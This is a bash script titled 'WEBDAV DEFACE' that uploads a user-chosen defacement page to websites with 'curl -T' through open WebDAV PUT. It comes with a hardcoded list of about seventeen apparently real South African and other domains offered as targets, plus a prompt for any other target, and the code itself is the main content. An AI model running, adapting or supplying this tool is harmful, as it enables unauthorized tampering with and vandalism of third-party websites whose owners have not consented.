#!/bin/bash

#CodedBy Jenktaki
#WEBDAVdeface

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd /sdcard
figlet -f pagga WEBDAV DEFACE | lolcat
      
      echo""
      echo $bi"  _____________________"
      echo $bi" /                    /"$bi"|" $me" on fb"
      echo $bi"/____________________/"$bi" |" $pu" ========================"
      echo $bi"|" $ku"•JENKTAKI•" $bi"|" $bi"|" $me" https://www.facebook.com/profile.php?id=100088718441097"
      echo $bi"|====================|"$bi" |" $pu" ========================"
      echo $bi"|" $ku"POGI SA CW  "$bi"|"$bi" |" $me" PAHINGI CHIX "
      echo $bi"|________|°|°|_______|"$bi"/" $pu"  ========================"
      echo ""
      echo $me"              ["$ku"-"$me"]"$cy"WEBDAV DEFACE"$me"["$ku"-"$me"]"
echo ""
echo $ku "*note:"
echo $me"|========================================|"
echo $me"|"$i"Script Deface Must be located in Sdcard"$me"|"
echo $me"|"$i"And don't put it in Folder Any"  $me "|"
echo $me"|========================================|"
echo ""
echo -n $ku"Name Script Deface?:" 
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $"CTRL+C Detected😢, Trying To Exit" | lolcat
echo ""
echo $" see you baby 😗" | lolcat
sleep 1 
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Don't have a Target Yet";
echo $me"[============"$pu"=============]"
echo $me"["$ku"2"$me"]" $pu"Already have a Target";
echo ""
echo    "╭─Jenk replied:" |lolcat
read -p "╰─#" pil;

case $pil in
1)echo ""
echo $pu"List Target:"
echo $pu"==========================="
echo $me"
http://contsol.co.za
http://colourfactory.co.za
http://scnc.co.za
http://windmillsandporcupines.co.za
http://cblandscapes.co.z
http://naturaleyeimages.com
http://bitsandpieces.co.za
http://infussion.co.za
http://thepremiummakers.com
http://mocosi.co.za
http://itsengineering.co.za
http://handj.co.za
http://ayk.co.za
http://holotropicbreathwork.co.za
http://foodconsult.co.za
http://daretogowildafrica.co.za
http://hybriddevelopments.co.za

"

echo ""
echo $pu"==========================="
echo -n $i"Put one of the targets:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Press Enter.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Please Check at$cy $tg/$sc" 
echo $me"========================================"

exit

;;


2)echo -n $i"input Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Press Enter.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"PLEASE CHECK IN $cy $tg/$sc" 
echo $me"========================================"

exit

;;


*) echo " JUST LOOK FOR THE EXISTING TOD " | lolcat
esac
done
done
